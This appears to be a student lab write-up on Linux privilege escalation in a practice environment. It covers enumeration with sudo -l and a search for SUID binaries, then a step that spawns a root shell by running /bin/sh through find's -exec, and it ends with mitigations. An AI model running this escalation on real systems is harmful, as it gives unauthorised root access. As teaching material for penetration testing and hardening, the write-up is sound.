# Lab 8 - Linux Privilege Escalation

> Lab Type: Red Team / Post-Exploitation

## Objective
The objective of this lab is to understand how attackers escalate privileges on a compromised Linux system to gain higher-level access (e.g., root).

## Lab Environment
- Operating System: Kali Linux (Attacker)
- Target: Vulnerable Linux machine (e.g., TryHackMe / local VM)
- Access Level: Low-privileged user

## Tools Used
- Linux Terminal
- `sudo`
- `find`
- `linpeas.sh` (optional)

## Background
Privilege escalation is a critical phase in penetration testing. After gaining initial access to a system, attackers attempt to elevate their privileges to gain full control. This can be done by exploiting misconfigurations, weak permissions, or vulnerable binaries.

## Steps Performed

### 1. Check Current User
```bash
whoami
```

- Confirmed current user is not root

---

### 2. Check Sudo Permissions
```bash
sudo -l
```

- Checked which commands can be executed with elevated privileges

---

### 3. Search for SUID Binaries
```bash
find / -perm -4000 2>/dev/null
```

- Identified binaries with SUID bit set
- These binaries can run with root privileges

---

### 4. Exploit SUID Binary (Example)
If a vulnerable binary like `find` is present:

```bash
find . -exec /bin/sh \; -quit
```

- Spawned a shell with elevated privileges

---

### 5. Verify Privilege Escalation
```bash
whoami
```

- Confirmed root access

---

## Result
- Successfully escalated privileges from a low-level user to root
- Gained full control over the system

---

## Analysis
- Misconfigured SUID binaries can be exploited for privilege escalation
- Lack of proper access control leads to system compromise
- Privilege escalation is often possible due to poor system hardening

---

## Impact
- Full system compromise
- Unauthorized access to sensitive data
- Ability to modify system configurations

---

## Key Takeaways
- Privilege escalation is a crucial phase in penetration testing
- SUID misconfigurations are a common vulnerability
- Proper system hardening is essential

---

## Mitigation
- Remove unnecessary SUID permissions
- Restrict sudo access
- Apply least privilege principle
- Regularly audit system configurations

---

## Notes
This lab was conducted in a controlled environment for educational purposes only.
